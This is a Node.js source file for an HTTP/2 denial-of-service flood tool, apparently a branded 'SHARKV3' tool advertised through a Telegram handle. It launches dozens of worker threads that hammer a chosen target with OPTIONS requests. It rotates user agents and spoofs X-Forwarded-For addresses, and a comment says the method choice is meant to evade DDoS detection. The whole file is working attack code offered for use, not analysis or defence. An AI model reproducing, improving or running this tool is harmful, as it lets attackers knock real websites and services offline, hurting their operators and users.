const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const fs = require('fs');
const net = require('net');

// Load user-agent list from file
const userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(Boolean);

// Constants
const THREADS = 16;
const INITIAL_CONNECTIONS = 20;
const POWER_MULTIPLIER = 2;
const WARMUP_TIME = 5000;
const MAX_INFLIGHT = 2000;
const IP_RANGE_START = 167772160;  // 10.0.0.0
const IP_RANGE_END = 184549375;    // 10.255.255.255

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`Warming up... Starting attack in 5s`);

    setTimeout(() => {
        console.clear();
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);

        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration, initial: true } });
        }

        setTimeout(() => {
            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
                new Worker(__filename, { workerData: { target, duration, initial: false } });
            }
        }, WARMUP_TIME);

        // Live stats
        setInterval(() => {
            maxRps = Math.max(maxRps, rpsLastSecond);
            renderStats();
            rpsLastSecond = 0;
        }, 1000);
    }, WARMUP_TIME);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') {
                totalRequests++;
                rpsLastSecond++;
            } else if (msg === 'ok') {
                successCount++;
            } else if (msg === 'err') {
                errorCount++;
            }
        });
    });
    server.listen(9999);
} else {
    const { target, duration, initial } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    // Function to generate a random IP within a specific range
    function generateRandomIP() {
        const randomIP = IP_RANGE_START + Math.floor(Math.random() * (IP_RANGE_END - IP_RANGE_START + 1));
        return ((randomIP >>> 24) & 255) + '.' + ((randomIP >>> 16) & 255) + '.' + ((randomIP >>> 8) & 255) + '.' + (randomIP & 255);
    }

    // Function to choose a random User-Agent from the list
    function getRandomUserAgent() {
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    // Function to create request headers with rotating spoofed headers
    function getSpoofedHeaders() {
        return {
            'User-Agent': getRandomUserAgent(),
            'X-Forwarded-For': generateRandomIP(),
            'Referer': `https://www.example.com/${Math.random().toString(36).substring(7)}`,
            'Origin': `https://www.example.com`,
            'Connection': 'keep-alive',
        };
    }

    function sendOne(client, inflight) {
        if (Date.now() > end) return;

        if (inflight.count >= MAX_INFLIGHT) {
            return setTimeout(() => sendOne(client, inflight), 1);
        }

        try {
            inflight.count++;
            const headers = getSpoofedHeaders();
            const req = client.request({ 
                ':path': '/', 
                ':method': 'OPTIONS', // Low-profile method to avoid triggering DDOS detection
                ...headers
            });

            req.setNoDelay?.(true);
            req.on('response', () => {
                sendStat('ok');
                inflight.count--;
            });
            req.on('error', () => {
                sendStat('err');
                inflight.count--;
            });
            req.end();
            sendStat('req');
        } catch {
            inflight.count--;
            sendStat('err');
        }

        setImmediate(() => sendOne(client, inflight));
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
            client.on('error', () => {});
            client.on('close', () => setTimeout(createConnection, 100));
            client.on('connect', () => {
                const inflight = { count: 0 };
                for (let i = 0; i < 100; i++) sendOne(client, inflight);
            });
        } catch {
            setTimeout(createConnection, 250);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
